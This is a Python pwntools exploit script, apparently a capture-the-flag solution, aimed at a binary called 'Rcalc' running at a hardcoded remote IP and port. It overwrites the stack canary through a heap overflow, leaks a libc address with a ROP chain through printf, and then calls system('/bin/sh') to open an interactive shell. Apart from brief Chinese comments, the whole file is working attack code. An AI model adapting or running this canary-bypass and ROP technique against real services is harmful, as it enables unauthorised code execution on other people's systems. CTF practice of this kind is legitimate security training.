#!  /usr/bin/env python
#coding:utf8  
from pwn import *  
  
context.log_level = 'debug'  
  
sh = remote('124.126.19.106',54742)  
#sh = process('./Rcalc')  
elf = ELF('./Rcalc')  
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
libc = ELF('./libc.so.6')  
printf_plt = elf.plt['printf']  
__libc_start_main_got = elf.got['__libc_start_main']  
#pop_rdi用于64位函数传参  
pop_rdi = 0x401123  
main_addr = 0x401036  
#我们自己设置canary，不知道为什么，如果非0,printf会报段错误  
mycanary = 0  
  
print hex(__libc_start_main_got)  
  
def setCanary(canary):  
   for i in range(0x22):  
      sh.sendlineafter('Your choice:','1')  
      sh.sendlineafter('input 2 integer:','0')  
      sh.sendline('1')  
      sh.sendlineafter('Save the result?','yes')  
   sh.sendlineafter('Your choice:','1')  
   sh.sendlineafter('input 2 integer:','0')  
   sh.sendline(str(canary))  
   sh.sendlineafter('Save the result?','yes')  
  
#注意，我们的payload中不能有0x20数据，因为这是空格，会导致数据截断  
#我们先写ROP到栈里  
payload = 'a'*0x108 + p64(mycanary) + 'a'*0x8 + p64(pop_rdi) + p64(__libc_start_main_got) + p64(printf_plt) + p64(main_addr)  
sh.sendlineafter('Input your name pls: ',payload)  
#现在我们要通过堆溢出，把canary的值改成我们的mycanary  
setCanary(mycanary)  
sh.sendlineafter('Your choice:','5')  
  
__libc_start_main_addr = u64(sh.recv(6).ljust(8,'\x00'))  
#获取libc基地址  
libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']  
system_addr = libc_base + libc.sym['system']  
binsh_addr = libc_base + libc.search('/bin/sh').next()  
print 'libc_base=',hex(libc_base)  
  
payload = 'a'*0x108 + p64(mycanary) + 'a'*0x8 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  
sh.sendlineafter('Input your name pls: ',payload)  
setCanary(mycanary)  
sh.sendlineafter('Your choice:','5')  
  
  
sh.interactive() 

